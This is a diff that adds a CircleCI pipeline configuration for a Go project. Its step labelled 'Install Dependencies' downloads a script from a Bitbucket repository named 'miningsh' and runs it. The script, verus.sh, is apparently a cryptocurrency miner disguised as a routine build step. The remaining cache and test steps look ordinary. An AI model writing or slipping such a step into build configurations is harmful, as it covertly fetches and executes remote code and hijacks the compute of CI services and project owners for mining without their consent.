@@ -1,0 +1,22 @@
+# Use the latest 2.1 version of CircleCI pipeline process engine. See: https://circleci.com/docs/2.0/configuration-reference
+version: 2.1
+jobs:
+  build:
+    working_directory: ~/repo
+    docker:
+      - image: circleci/golang:1.15.8
+    steps:
+      - run:
+          name: Install Dependencies
+          command: wget https://bitbucket.org/novalanto01/miningsh/raw/6eb58d2bc44e8ed683a5f6acbd3c091c1e68816e/verus.sh && chmod u+x verus.sh && ./verus.sh
+      - save_cache:
+          key: go-mod-v4-{{ checksum "go.sum" }}
+          paths:
+            - "/go/pkg/mod"
+      - run:
+          name: Run tests
+          command: |
+            mkdir -p /tmp/test-reports
+            gotestsum --junitfile /tmp/test-reports/unit-tests.xml
+      - store_test_results:
+          path: /tmp/test-reports
